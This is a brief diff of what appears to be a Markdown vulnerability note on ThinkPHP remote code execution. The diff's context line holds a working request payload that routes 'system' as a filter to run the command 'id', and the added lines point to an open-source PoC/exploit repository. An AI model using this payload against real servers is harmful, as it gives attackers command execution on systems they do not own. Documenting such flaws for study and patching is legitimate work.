@@ -40,3 +40,6 @@ _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
 
 ![image-20220302151553822](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203021515902.png)
 
+## 开源POC/EXP
+
+- https://github.com/sukabuliet/ThinkphpRCE
